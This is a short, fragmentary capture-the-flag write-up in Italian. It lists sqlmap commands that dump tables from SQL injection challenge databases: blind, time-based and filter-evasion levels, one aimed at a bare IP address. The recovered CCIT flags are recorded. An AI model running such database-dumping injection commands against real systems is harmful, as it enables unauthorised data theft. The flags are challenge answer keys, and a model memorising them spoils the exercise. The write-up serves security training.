...
sqlmap -r inj_lvl_3.txt -D blinddb -T secret -C asecret --dump -> Trovo la flag. -> CCIT{A_bl1ndy_fl4g}.
```
...
sqlmap -r inj_lvl_4.txt -D timedb -T flags -C flag --dump -> Trovo la flag. -> CCIT{Dont_trus7_tim3}.
```
...
sqlmap -u http://149.202.200.158:5111/post.php?id=#1 --tamper=symboliclogical --hex -D filtered -T flaggy --dump
Trovo la flag -> CCIT{Bl4ckl1sts_Ar3_s0_c00l}.
